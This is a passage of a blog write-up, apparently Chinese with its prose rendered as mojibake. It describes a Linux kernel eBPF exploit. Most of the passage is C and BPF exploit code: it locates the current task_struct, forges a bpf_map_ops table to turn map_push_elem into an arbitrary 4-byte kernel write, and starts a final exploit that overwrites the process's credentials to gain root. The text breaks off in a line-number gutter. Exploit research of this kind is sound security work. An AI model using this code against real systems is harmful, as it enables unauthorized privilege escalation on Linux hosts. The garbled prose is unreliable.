class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">size_t</span> current_task;<br><br><span class="hljs-type">size_t</span> <span class="hljs-title function_">search_for_current_task</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> next_task = INIT_TASK + kernel_offset + <span class="hljs-number">0x818</span>;<br>    <span class="hljs-type">size_t</span> data;<br><br>    prctl(PR_SET_NAME, <span class="hljs-string">&quot;arttnba3&quot;</span>);<br><br>    <span class="hljs-keyword">do</span> &#123;<br>        next_task = read_arbitrary_addr(map_fd, next_task);<br>        data = read_arbitrary_addr(map_fd, next_task + <span class="hljs-number">0x2d0</span>);<br>    &#125; <span class="hljs-keyword">while</span> (data != *(<span class="hljs-type">size_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>);<br><br>    current_task = next_task - <span class="hljs-number">0x818</span>;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Get current task_struct&#x27;s addr: \033[0m%lx\n&quot;</span>,<br>           current_task);<br>&#125;<br></code></pre></td></tr></table></figure><p>æˆåŠŸè·å¾—å½“å‰è¿›ç¨‹çš„ <code>task_struct</code> åœ°å€ï¼š</p><p><img src="https://s2.loli.net/2023/06/06/tVo6viTK8C53Y1F.png" alt="image.png"></p><h2 id="äº”ã€ä»»æ„åœ°å€å†™"><a href="#äº”ã€ä»»æ„åœ°å€å†™" class="headerlink" title="äº”ã€ä»»æ„åœ°å€å†™"></a>äº”ã€ä»»æ„åœ°å€å†™</h2><p>æˆ‘ä»¬åŒæ—¶æœ‰ map çš„åœ°å€å’Œå†…æ ¸åŸºå€ï¼ŒåŒæ—¶è¿˜èƒ½ç›´æ¥æ”¹å†™ map å†…éƒ¨çš„å†…å®¹ï¼Œä¸éš¾æƒ³åˆ°çš„æ˜¯æˆ‘ä»¬å¯ä»¥ç›´æ¥åœ¨ map ä¸Šæ„é€  fake map ops ååŠ«æŒ map å‡½æ•°è¡¨ä»è€ŒåŠ«æŒå†…æ ¸æ§åˆ¶æµ</p><p>æ¯”è¾ƒä¼ ç»Ÿçš„æ–¹å¼å°±æ˜¯ç›´æ¥æ ˆè¿ç§»ç„¶å ROP æ‰§è¡Œ <code>commit_cred(&amp;init_cred)</code>ï¼Œä½†ç¬”è€…çœ‹åˆ°ä¸€ä¸ªéå¸¸æœ‰æ„æ€çš„æ„é€ ä»»æ„å†™çš„æ€è·¯ï¼Œæ‰€ä»¥è¿™é‡Œä¹Ÿç”¨è¿™ç§è§£æ³•ï¼ˆç¬‘ï¼‰</p><p>æ³¨æ„åˆ° array map çš„ <code>map_get_next_key()</code> å®šä¹‰å¦‚ä¸‹ï¼Œå½“ <code>key</code> å°äº <code>map.max_entries</code> æ—¶ <code>key</code> ä¼šè¢«å†™å…¥åˆ° <code>next_key</code> å½“ä¸­ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Called from syscall */</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">array_map_get_next_key</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bpf_map *<span class="hljs-built_in">map</span>, <span class="hljs-type">void</span> *key, <span class="hljs-type">void</span> *next_key)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_array</span> *<span class="hljs-title">array</span> =</span> container_of(<span class="hljs-built_in">map</span>, <span class="hljs-keyword">struct</span> bpf_array, <span class="hljs-built_in">map</span>);<br>u32 index = key ? *(u32 *)key : U32_MAX;<br>u32 *next = (u32 *)next_key;<br><br><span class="hljs-keyword">if</span> (index &gt;= <span class="hljs-built_in">array</span>-&gt;<span class="hljs-built_in">map</span>.max_entries) &#123;<br>*next = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (index == <span class="hljs-built_in">array</span>-&gt;<span class="hljs-built_in">map</span>.max_entries - <span class="hljs-number">1</span>)<br><span class="hljs-keyword">return</span> -ENOENT;<br><br>*next = index + <span class="hljs-number">1</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>å½“ç„¶å¯¹äºå¸¸è§„çš„è°ƒç”¨ <code>map_get_next_key()</code> çš„æµç¨‹è€Œè¨€è™½ç„¶ <code>key</code> çš„å†…å®¹æ˜¯å¯æ§çš„ä½†æ˜¯ <code>next_key</code> æŒ‡é’ˆä¸æ˜¯æˆ‘ä»¬æ‰€èƒ½æ§åˆ¶çš„ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">map_get_next_key</span><span class="hljs-params">(<span class="hljs-keyword">union</span> bpf_attr *attr)</span><br>&#123;<br><span class="hljs-comment">//...</span><br>next_key = kmalloc(<span class="hljs-built_in">map</span>-&gt;key_size, GFP_USER);<br><span class="hljs-comment">//...</span><br><br>rcu_read_lock();<br>err = <span class="hljs-built_in">map</span>-&gt;ops-&gt;map_get_next_key(<span class="hljs-built_in">map</span>, key, next_key);<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯åœ¨ map ops å½“ä¸­æœ‰ä¸€äº›å‡½æ•°å¯ä»¥è®©æˆ‘ä»¬æ§åˆ¶è¿™ä¸¤ä¸ªå‚æ•°ï¼Œ<strong>æˆ‘ä»¬å¯ä»¥å°†è¿™æ ·çš„å‡½æ•°æŒ‡é’ˆæ›¿æ¢ä¸º</strong>  <code>map_get_next_key()</code> <strong>ä»è€Œå®Œæˆä»»æ„åœ°å€å†™</strong>ï¼Œä¾‹å¦‚ <code>map_push_elem()</code> ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_map_ops</span> &#123;</span><br><span class="hljs-comment">//...</span><br><span class="hljs-type">int</span> (*map_push_elem)(<span class="hljs-keyword">struct</span> bpf_map *<span class="hljs-built_in">map</span>, <span class="hljs-type">void</span> *value, u64 flags);<br></code></pre></td></tr></table></figure><p>å½“æˆ‘ä»¬æ›´æ–° eBPF map æ—¶ï¼Œè‹¥ map ç±»å‹ä¸º <code>BPF_MAP_TYPE_QUEUE</code> æˆ– <code>BPF_MAP_TYPE_STACK</code> ï¼Œåˆ™è¿™ä¸ªå‡½æ•°ä¼šè¢«è°ƒç”¨ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">bpf_map_update_value</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bpf_map *<span class="hljs-built_in">map</span>, <span class="hljs-keyword">struct</span> fd f, <span class="hljs-type">void</span> *key,</span><br><span class="hljs-params"><span class="hljs-type">void</span> *value, __u64 flags)</span><br>&#123;<br><span class="hljs-comment">//...</span><br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_QUEUE ||<br>   <span class="hljs-built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_STACK) &#123;<br>err = <span class="hljs-built_in">map</span>-&gt;ops-&gt;map_push_elem(<span class="hljs-built_in">map</span>, value, flags);<br></code></pre></td></tr></table></figure><p>ä¸è¿‡åœ¨æˆ‘ä»¬è°ƒç”¨ <code>bpf_map_update_value()</code> æ—¶è¿˜æœ‰ä¸€ä¸ªæ£€æŸ¥ï¼Œè‹¥ flags è®¾ç½®äº† <code>BPF_F_LOCK</code> æ ‡å¿—ä½ï¼Œåˆ™ä¼šæ£€æŸ¥ <code>map-&gt;spin_lock_off</code> æ˜¯å¦å¤§äºç­‰äº 0ï¼Œè‹¥éåˆ™ä¼šç›´æ¥æŠ¥é”™è¿”å›ï¼Œå› æ­¤è¿™é‡Œæˆ‘ä»¬è¿˜è¦å°†è¯¥å­—æ®µæ”¹ä¸ºä¸€ä¸ªæ­£æ•´æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* flags for BPF_MAP_UPDATE_ELEM command */</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> &#123;</span><br>BPF_ANY= <span class="hljs-number">0</span>, <span class="hljs-comment">/* create new element or update existing */</span><br>BPF_NOEXIST= <span class="hljs-number">1</span>, <span class="hljs-comment">/* create new element if it didn&#x27;t exist */</span><br>BPF_EXIST= <span class="hljs-number">2</span>, <span class="hljs-comment">/* update existing element */</span><br>BPF_F_LOCK= <span class="hljs-number">4</span>, <span class="hljs-comment">/* spin_lock-ed map_lookup/map_update */</span><br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">bool</span> map_value_has_spin_lock(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> bpf_map *<span class="hljs-built_in">map</span>)<br>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">map</span>-&gt;spin_lock_off &gt;= <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">map_update_elem</span><span class="hljs-params">(<span class="hljs-keyword">union</span> bpf_attr *attr)</span><br>&#123;<br><span class="hljs-comment">//...</span><br><br><span class="hljs-keyword">if</span> ((attr-&gt;flags &amp; BPF_F_LOCK) &amp;&amp;<br>    !map_value_has_spin_lock(<span class="hljs-built_in">map</span>)) &#123;<br>err = -EINVAL;<br><span class="hljs-keyword">goto</span> err_put;<br>&#125;<br><br><span class="hljs-comment">//...</span><br>err = bpf_map_update_value(<span class="hljs-built_in">map</span>, f, key, value, attr-&gt;flags);<br></code></pre></td></tr></table></figure><p>æœ€åæˆ‘ä»¬çš„ä»»æ„å†™æ–¹æ¡ˆå¦‚ä¸‹ï¼šæˆ‘ä»¬å¯ä»¥åœ¨ <code>bpf_array.value</code> ä¸Šæ„é€ ä¸€ä¸ª fake ops å°† <code>ops-&gt;map_push_elem</code> æ›¿æ¢ä¸º <code>array_map_get_next_key()</code> ï¼Œä¹‹åæ›¿æ¢æ‰ map çš„å‡½æ•°è¡¨ï¼Œå¹¶æ›´æ”¹ <code>map.max_entries</code> ä¸º <code>0xffffffff</code> ã€æ›´æ”¹ map ç±»å‹ä¸º  <code>BPF_MAP_TYPE_STACK</code> ã€æ›´æ”¹ <code>map.spin_lock_off</code> ä¸ºæ­£æ•°æ¥å®ç°ä»»æ„åœ°å€å†™ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯<strong>å•æ¬¡åªèƒ½å†™ 4 å­—èŠ‚</strong>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAKE_ARBITRARY_WRITE_OPS(__map_fd)          \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* extend the alu_limit */</span>                      \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(0, __map_fd, BPF_REG_7), \</span><br><span class="hljs-meta">        BPF_MOV64_REG(BPF_REG_8, VULN_REG),             \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, 0x1000),      \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_MUL, BPF_REG_8, 0x1000),      \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_8),   \</span><br><span class="hljs-meta">        BPF_MOV64_REG(BPF_REG_8, VULN_REG),             \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* overwrite spin_lock_off */</span>                   \</span><br><span class="hljs-meta">        BPF_MOV64_REG(VULN_REG, BPF_REG_8),             \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_MUL, VULN_REG, 0xE4),         \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, VULN_REG),    \</span><br><span class="hljs-meta">        BPF_MOV64_IMM(BPF_REG_5, 0x2000),               \</span><br><span class="hljs-meta">        BPF_STX_MEM(BPF_W, BPF_REG_7, BPF_REG_5, 0),    \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* overwrite max_entries */</span>                     \</span><br><span class="hljs-meta">        BPF_MOV64_REG(VULN_REG, BPF_REG_8),             \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_MUL, VULN_REG, 0x8),          \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, VULN_REG),    \</span><br><span class="hljs-meta">        BPF_MOV64_IMM(BPF_REG_5, 0xffffffff),           \</span><br><span class="hljs-meta">        BPF_STX_MEM(BPF_W, BPF_REG_7, BPF_REG_5, 0),    \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* overwrite map type */</span>                        \</span><br><span class="hljs-meta">        BPF_MOV64_REG(VULN_REG, BPF_REG_8),             \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_MUL, VULN_REG, 0xC),          \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, VULN_REG),    \</span><br><span class="hljs-meta">        BPF_MOV64_IMM(BPF_REG_5, 23),                   \</span><br><span class="hljs-meta">        BPF_STX_MEM(BPF_W, BPF_REG_7, BPF_REG_5, 0),    \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* overwrite the map-&gt;ops */</span>                    \</span><br><span class="hljs-meta">        BPF_MOV64_REG(VULN_REG, BPF_REG_8),             \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_MUL, VULN_REG, 0x18),         \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, VULN_REG),    \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(2, __map_fd, BPF_REG_4), \</span><br><span class="hljs-meta">        BPF_LDX_MEM(BPF_DW, BPF_REG_5, BPF_REG_4, 0),   \</span><br><span class="hljs-meta">        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_5, 0)</span><br><br><span class="hljs-type">size_t</span> fake_ops_addr;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">make_arbitrary_write_ops</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_insn</span> <span class="hljs-title">prog</span>[] =</span> &#123;<br>        TRIGGER_VULN(map_fd),<br>        MAKE_VULN_REG(map_fd),<br>        MAKE_ARBITRARY_WRITE_OPS(map_fd),<br>        BPF_EXIT_INSN()<br>    &#125;;<br>    <span class="hljs-type">int</span> key;<br>    <span class="hljs-type">size_t</span> per_ops_ptr, value[<span class="hljs-number">0x1000</span>], value_idx;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_map_ops</span> *<span class="hljs-title">ops_data</span>;</span><br><br>    <span class="hljs-comment">/* save fake ops addr into map */</span><br>    fake_ops_addr = map_addr + <span class="hljs-number">0x110</span> + MAP_SIZE;<br><br>    <span class="hljs-comment">/* read ops */</span><br>    value_idx = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> bpf_map_ops); i += <span class="hljs-number">8</span>) &#123;<br>        per_ops_ptr = read_arbitrary_addr(map_fd, map_ops_addr + i);<br>        value[value_idx++] = per_ops_ptr;<br>    &#125;<br><br>    <span class="hljs-comment">/* load ops */</span><br>    ops_data = (<span class="hljs-keyword">struct</span> bpf_map_ops *) value;<br>    ops_data-&gt;map_push_elem = (<span class="hljs-type">void</span>*) (ARRAY_MAP_GET_NEXT_KEY + kernel_offset);<br>    key = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span> (bpf_map_update_elem(map_fd, &amp;key, &amp;value[<span class="hljs-number">0</span>], <span class="hljs-number">0</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to look up value!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* we&#x27;ll take fake ops&#x27;s addr from map */</span><br>    key = <span class="hljs-number">2</span>;<br>    value[<span class="hljs-number">0</span>] = fake_ops_addr;<br>    <span class="hljs-keyword">if</span> (bpf_map_update_elem(map_fd, &amp;key, &amp;value[<span class="hljs-number">0</span>], <span class="hljs-number">0</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to look up value!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* hijack the map */</span><br>    run_bpf_prog(prog, <span class="hljs-keyword">sizeof</span>(prog) / <span class="hljs-keyword">sizeof</span>(prog[<span class="hljs-number">0</span>]), <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">arbitrary_write_4_bytes_by_map</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd, <span class="hljs-type">size_t</span> addr, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> val)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> value[<span class="hljs-number">0x1000</span>];<br>    <span class="hljs-type">int</span> key;<br><br>    key = <span class="hljs-number">0</span>;<br>    value[<span class="hljs-number">0</span>] = val - <span class="hljs-number">1</span>;<br><br>    <span class="hljs-keyword">return</span> bpf_map_update_elem(map_fd, &amp;key, &amp;value[<span class="hljs-number">0</span>], addr);<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="Final-Exploit"><a href="#Final-Exploit" class="headerlink" title="Final Exploit"></a>Final Exploit</h2><p>æœ€åçš„ exp å¦‚ä¸‹ï¼Œå› ä¸ºåœ¨ <code>array_map_get_next_key()</code> ä¸­ä¼šæ£€æŸ¥ <code>index != max_entries - 1</code> ï¼Œè€Œ <code>init_cred</code> çš„é«˜ 32 ä½å¿…å®šæ˜¯ <code>0xFFFFFFFF</code> ï¼Œå› æ­¤è¿™é‡Œç¬”è€…é€‰æ‹©ç›´æ¥æ”¹å†™å½“å‰è¿›ç¨‹çš„ <code>task_struct.cred</code> çš„ uid ä¸ gid ç›¸å…³å­—æ®µï¼š</p><blockquote><p>æ³¨ï¼šè¿™é‡Œç¬”è€…å°†å¸¸ç”¨å‡½æ•° &amp; æŒ‡ä»¤å°è£…åœ¨äº† <a href="/download/bpf_tools.h">bpf_tools.h</a> ä¸­</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span 